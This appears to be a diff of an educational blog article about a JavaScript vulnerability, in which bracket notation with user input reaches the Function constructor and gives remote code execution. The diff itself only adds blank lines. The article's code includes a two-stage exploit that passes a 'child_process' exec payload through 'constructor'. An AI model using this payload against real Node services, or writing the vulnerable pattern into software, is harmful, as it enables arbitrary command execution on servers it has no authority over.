@@ -10,8 +10,10 @@ Let's take a look at why this could be a problem.
 
 ## Issue #1: Bracket object notation with user input grants access to every property available on the object
 
+
 ```js
 exampleClass[userInput[0]] = userInput[1];
+
 
 
 ```
@@ -20,9 +22,11 @@ I won't spend much time here, as I believe this is fairly well known. If example
 
 ## Issue #2: Bracket object notation with user input grants access to every property available on the object, **_including prototypes._**
 
+
 ```js
 userInput = ['constructor', '{}'];
 exampleClass[userInput[0]] = userInput[1];
+
 
 
 ```
@@ -32,6 +36,7 @@ This looks pretty innocuous, even if it is an uncommon pattern. The problem here
 ## Issue #3: Bracket object notation with user input grants access to every property available on the object, including prototypes, **_which can lead to Remote Code Execution._**
 
 Now here's where things get really dangerous. It's also where example code gets really implausible - bear with me.
+
 
 ```js
 var user = function () {
@@ -45,6 +50,7 @@ function handler(userInput) {
 }
 
 
+
 ```
 
 In the previous section, I mentioned that constructor can be accessed from square brackets. In this case, since we are dealing with a function, the constructor we get back is the `Function` Constructor, which compiles a string of code into a function.
@@ -52,6 +58,7 @@ In the previous section, I mentioned that constructor can be accessed from squar
 ## Exploitation
 
 In order to exploit the above code, we need a two stage exploit function.
+
 
 ```js
 function exploit(cmd) {
@@ -63,11 +70,13 @@ function exploit(cmd) {
 }
 
 
+
 ```
 
 Let's break it down.
 
 The first time handler is run, it looks something like this:
+
 
 ```js
 userInput[0] = 'constructor';
@@ -76,9 +85,11 @@ userInput[1] = 'require("child_process").exec(arguments[0],console.log)';
 user['anyVal'] = user['constructor'](userInput[1]);
 
 
+
 ```
 
 Executing this code creates a function containing the payload, and assigns it to `user['anyVal']`:
+
 
 ```js
 user['anyVal'] = function () {
@@ -86,12 +97,15 @@ user['anyVal'] = function () {
 };
 
 
+
 ```
 
 And when handler is run a second time:
 
+
 ```js
 user.anyVal = user.anyVal('date');
+
 
 
 ```
